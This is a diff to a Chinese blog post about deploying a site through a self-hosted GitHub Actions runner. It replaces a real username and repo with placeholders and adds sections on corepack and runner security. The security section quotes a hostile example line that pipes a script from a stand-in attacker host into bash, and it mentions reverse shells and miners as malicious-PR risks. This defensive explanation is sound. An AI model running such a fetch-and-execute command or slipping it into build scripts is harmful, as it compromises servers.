@@ -54,7 +54,7 @@ GitHub Actions 报错：
 The job was not acquired by Runner of type hosted even after multiple attempts
 ```
 
-我以为是 GitHub 服务挂了，等了一会重试，还是不行。本地 `ssh ubuntu@<YOUR_SERVER_IP>` 完全正常，说明不是 SSH 配置问题。
+我以为是 GitHub 服务挂了，等了一会重试，还是不行。本地 `ssh <USER>@<YOUR_SERVER_IP>` 完全正常，说明不是 SSH 配置问题。
 
 最后发现问题：**GitHub Actions 的托管 Runner 在美国，服务器的安全策略把海外 IP 标记为高危，直接拦截了**。
 
@@ -192,7 +192,7 @@ sudo systemctl restart nginx
 ```bash
 # 服务器上克隆代码
 mkdir -p <YOUR_PARENT_DIR> && cd <YOUR_PARENT_DIR>
-git clone git@github.com:qinxiushan/personal-website.git chengjiabiao
+git clone git@github.com:<USER>/<REPO>.git chengjiabiao
 cd chengjiabiao
 ```
 
@@ -243,3 +243,79 @@ pnpm run build
 - 优化构建速度（pnpm 缓存）
 
 完整的技术文档已经写进项目根目录的 `部署集成自动化工作流说明.md`，可以参考。
+
+## 八、补充：关于 corepack 和 pnpm 安装
+
+有读者问：为什么用 `corepack` 而不是 `npm install -g pnpm`？
+
+两者都能装 pnpm，但有本质区别：
+
+| 方式 | 版本控制 | 推荐 |
+|---|---|---|
+| `npm install -g pnpm` | 全局最新版，可能不匹配项目要求 | ❌ |
+| `corepack prepare pnpm@11.2.2 --activate` | 锁定到项目要求的版本 | ✅ |
+
+`package.json` 里写了 `"packageManager": "pnpm@11.2.2"`，corepack 会确保使用这个版本。如果用 `npm install -g pnpm`，可能装到 `pnpm@12.x`（最新版），然后报各种兼容性错误。
+
+**corepack 是 Node.js 官方内置的包管理器管理工具**（Node 16.10+），不需要额外安装。
+
+## 九、安全风险与防护
+
+部署跑通后，我才意识到几个安全问题，这里补充一下。
+
+### 9.1 公开仓库 + Self-hosted Runner 风险
+
+GitHub 在配置 Runner 页面会提示：
+
+> Using self-hosted runners in public repositories is not recommended. Forks of your public repository can potentially run dangerous code on your self-hosted runner by creating a pull request.
+
+**这意味着**：如果我的仓库是 public，任何人都可以 fork 后提一个 PR，PR 触发的 workflow 会执行**我的服务器上的代码**。
+
+**风险场景**：
+- 恶意 PR 在 build 脚本里加 `curl https://evil.com/x.sh | bash`
+- 反向 shell 连接到攻击者服务器
+- 读取服务器敏感文件
+- 安装挖矿程序
+
+**为什么我的方案相对安全**：
+- workflow 只监听 `push: branches: [main]` 和 `workflow_dispatch`
+- **不监听 `pull_request` 事件** → 外部 PR 不会触发部署
+- 只有仓库管理员（我）能 push 到 main 分支
+
+**进一步加固**（推荐）：
+1. workflow 显式排除 PR 触发（防御性写法）
+2. Runner 用户用低权限账号，不用 `sudo`
+3. 服务器加 fail2ban 防爆破
+4. 定期审计 Runner 日志
+
+### 9.2 暴露 IP 和路径的风险
+
+写博客时差点把服务器的 IP、用户名、项目路径都贴出来。**这是非常危险的**：
+- 攻击者拿到 IP → 扫描端口
+- 拿到用户名 → SSH 爆破
+- 拿到路径 → 针对性攻击
+
+**正确做法**：
+- 博客用占位符 `<YOUR_SERVER_IP>`、`<YOUR_PROJECT_PATH>`
+- 真实配置写在私有笔记或本地文档
+- 服务器用非默认端口（不要用 22）
+- SSH 禁用密码登录，只允许密钥
+- 关键路径在 Nginx 配 `internal` 限制外部访问
+
+### 9.3 为什么我没用 Docker
+
+理论上 Docker 隔离更安全（构建在容器里，不污染宿主机），但 Self-hosted Runner 已经是独立用户运行的进程，隔离性足够。Docker 会增加复杂度：构建慢、需要管理镜像、占用更多磁盘。
+
+**什么时候应该用 Docker**：
+- 多人协作的团队项目
+- 公共仓库 + 担心 PR 风险
+- 构建环境需要严格一致
+
+---
+
+**总结：自动化部署是"用便利换风险"的过程**，一定要清楚自己在做什么、暴露了什么。我的方案因为：
+- 单人维护
+- 只监听 push 事件
+- 关键信息用占位符
+
+所以风险可控。但如果你的仓库是多人协作的公共项目，建议重新评估 Self-hosted Runner 的必要性。
